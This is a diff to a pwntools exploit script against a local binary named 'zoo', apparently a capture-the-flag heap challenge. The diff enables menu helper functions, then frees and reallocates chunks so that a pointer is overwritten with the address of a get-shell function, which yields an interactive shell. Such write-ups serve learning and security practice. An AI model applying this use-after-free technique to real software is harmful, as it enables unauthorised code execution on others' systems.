@@ -32,21 +32,34 @@ def debug(breakpoint=''):
 elf = ELF('./zoo')
 context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
 
-# def add_animal(size, name):
-#     sla("> ", "1")
-#     sla("2) Panda", "1")
-#     sla("How long is the name? (max: 64 characters", str(size))
-#     sla("Name of animal?", name)
+def add_animal(size, name):
+    sla("> ", "1")
+    sla("2) Panda", "1")
+    sla("How long is the name? (max: 64 characters", str(size))
+    sa("Name of animal?", name)
 
-# def remove_animal(idx):
-#     sla("> ", "2")
-#     sla("Zone number? (0-9)", str(idx))
+def remove_animal(idx):
+    sla("> ", "2")
+    sla("Zone number? (0-9)", str(idx))
 
-# def report_name(idx):
-#     sla("> ", "3")
-#     sla("Zone number? (0-9)", str(idx))
+def report_name(idx):
+    sla("> ", "3")
+    sla("Zone number? (0-9)", str(idx))
 
 
 p = process("./zoo")
-debug()
+
+add_animal(0x20, "a" * 0x20) #0
+add_animal(0x20, "a" * 0x20) #1
+add_animal(0x20, "b" * 0x20) #2
+
+remove_animal(0)
+remove_animal(1)
+
+
+get_shell_addr = 0x401276
+add_animal(0x10, p64(get_shell_addr)) #0
+# debug()
+
+
 p.interactive()
